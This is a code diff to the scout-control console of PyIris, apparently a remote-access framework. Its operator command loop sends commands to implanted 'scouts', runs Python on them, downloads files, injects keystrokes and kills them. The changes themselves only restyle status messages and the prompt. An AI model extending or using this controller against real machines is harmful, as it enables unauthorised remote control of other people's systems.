@@ -45,33 +45,34 @@ def main(scout_id):
     try:
         scout_id = scout_id.split(' ', 1)[1]
         scout_prompt = config.scout_database[scout_id][1] + ':' + config.scout_database[scout_id][2]
-        print '[+]Bridged to : ' + scout_id
+        print config.pos + 'Bridged to : ' + scout_id
     except (IndexError, KeyError):
-        print '[-]Please enter a valid scout ID'
+        print config.neg + 'Please enter a valid scout ID'
         return
     while True:
         try:
-            prompt = raw_input('PyIris (Scout@' + scout_prompt + ') > ').strip()
+            prompt = raw_input(
+                '\x1b[1m\x1b[37mPyIris (\x1b[0m\033[1m\033[0m\033[91mScout\033[1m\033[0m\x1b[1m\x1b[37m@\x1b[0m\033[1m\033[0m\033[91m' + scout_prompt + '\033[1m\033[0m\x1b[1m\x1b[37m) > \x1b[0m').strip()
             command = prompt.split(' ', 1)[0].lower()
             if command == 'back':
-                print '[*]Returning to scout interface...'
+                print config.inf + 'Returning to scout interface...'
                 return
             elif command == 'clear':
                 clear.main()
             elif command == 'disconnect':
                 print send_and_recv.main(prompt, scout_id)
                 del (config.scout_database[scout_id])
-                print '[*]Returning...'
+                print config.inf + 'Returning...'
                 return
             elif command == 'kill':
                 print send_and_recv.main(prompt, scout_id)
                 del (config.scout_database[scout_id])
-                print '[*]Returning...'
+                print config.inf + 'Returning...'
                 return
             elif command in ('!', 'local'):
                 local.main(prompt)
             elif command == 'main':
-                print '[*]Returning to scout interface...'
+                print config.inf + 'Returning to scout interface...'
                 return 'home'
             elif command == 'python':
                 python.main()
@@ -82,7 +83,7 @@ def main(scout_id):
                 print data
                 if data.startswith('[*]'):
                     del (config.scout_database[scout_id])
-                    print '[*]Returning...'
+                    print config.inf + 'Returning...'
                     return
             elif command == 'download':
                 config.scout_database[scout_id][0].sendall(prompt)
@@ -98,16 +99,16 @@ def main(scout_id):
             elif command == 'ping':
                 alive_bool = ping.main(scout_id)
                 if not alive_bool:
-                    print '[*]Returning...'
+                    print config.inf + 'Returning...'
                     return
             elif command == 'exec_py_script':
                 data = 'exec_py ' + python_execute_editor.main()
-                print '[*]Attempting to run on scout...'
+                print config.inf + 'Attempting to run on scout...'
                 print send_and_recv.main(data, scout_id)
             elif command == 'exec_py_file':
                 python_execute_file.main(prompt, scout_id)
             elif command == 'inj_valid':
-                print '\n[*]All valid keys that can be injected : \n'
+                print '\n' + config.inf + 'All valid keys that can be injected : \n'
                 formatted = grid_format.main(valid_keys, 5)
                 for i in formatted:
                     print '   ' + ''.join(i)
@@ -118,7 +119,7 @@ def main(scout_id):
                 config.scout_database[scout_id][0].sendall(prompt)
                 data = recv_all.main(config.scout_database[scout_id][0])
                 print data
-                # print '[-]Invalid command, run "help" for help menu'
+                # print config.neg + 'Invalid command, run "help" for help menu'
         except EOFError:
             try:
                 time.sleep(2)
@@ -127,6 +128,6 @@ def main(scout_id):
         except KeyboardInterrupt:
             quit.main()
         except (socket.error, socket.timeout):
-            print '[-]Scout has unexpectedly died, removing from database...'
+            print config.neg + 'Scout has unexpectedly died, removing from database...'
             del (config.scout_database[scout_id])
             return
